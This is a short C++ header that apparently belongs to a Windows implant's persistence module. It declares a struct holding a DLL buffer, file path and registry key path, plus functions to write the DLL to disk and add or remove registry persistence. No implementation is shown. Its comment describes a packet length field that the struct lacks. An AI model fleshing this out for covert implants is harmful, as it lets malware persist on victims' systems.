#ifndef _PERSIST
#define _PERSIST

#include <Windows.h>
#include <string>

/*
 * Struct for the management header
 * Added packet len so the client could send variable length padding
 * to vary the size of the packets
 */
typedef struct {  

	char *dll_file_buf;
	DWORD dll_file_size;
	std::string dll_file_path;
	std::string reg_key_path;

} PERSIST_STRUCT, *PPERSIST_STRUCT;

bool ReadDllIntoMemory( PERSIST_STRUCT *persist_ptr );
bool WriteDllToDisk( PERSIST_STRUCT *persist_ptr );
bool AddPersistence( PERSIST_STRUCT *persist_ptr );
bool RemovePersistence( PERSIST_STRUCT *persist_ptr );



#endif